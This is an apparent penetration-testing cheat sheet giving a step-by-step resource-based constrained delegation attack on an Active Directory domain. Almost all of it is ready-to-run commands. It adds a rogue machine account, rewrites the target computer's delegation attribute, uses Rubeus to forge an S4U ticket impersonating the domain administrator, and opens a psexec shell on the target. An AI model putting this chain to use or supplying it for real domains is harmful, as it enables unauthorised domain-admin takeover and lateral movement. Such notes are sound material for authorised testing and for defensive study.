If we have genericwrite on a computer then we could perform this attack.

> We start by loading PowerView and Powermad into our session then adding a new machine account:

```
New-MachineAccount -MachineAccount attackercomp -Password $(ConvertTo-SecureString 'Summer2026!' -AsPlainText -Force)

Get-DomainComputer -Identity attackercomp
```

> Once the machine account has been confirmed now we need to obtain the SID and convert the SID of our newly created computer object to the correct format to proceed with the attack:

```
$sid =Get-DomainComputer -Identity attackercomp -Properties objectsid | Select -Expand objectsid
```

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
```

```
$SDbytes = New-Object byte[] ($SD.BinaryLength)
```

```
$SD.GetBinaryForm($SDbytes,0)
```

For this command we need the hostname for our target machine:

```
Get-DomainComputer -Identity <target_hostname> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

> Now we will use Rubeus to obtain the hash of the new computer account:

```
.\Rubeus.exe hash /password:Summer2026!
```

> Now we will perform the attack:

```
.\Rubeus.exe s4u /user:attackercomp$ /rc4:<hash> /impersonateuser:administrator /msdsspn:CIFS/<target_hostname>.<domain> /ptt
```

Here we will obtain the ticket for the administrator user. Now we will copy this to a file on kali called ticket.kirbi. 

**NOTE**: Make sure to tab everything over so its lined up in the file using SHIFT + TAB.

> Now we will convert this to a ccache file using ticketconverter:

```
python3 ticketConverter.py ticket.kirbi ticket.ccache --base64
```

> Then we will export it to our env and verify:

```
export KRB5CCNAME=./ticket.ccache
klist
```

> Now we will add our target computer we want to move to in our /etc/hosts file on kali:

```
<target_ip> <target_hostname>.<domain>
```

> Now we can login:

```
python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass -dc-ip <dc_ip> administrator@<target_hostname>.<domain>
```
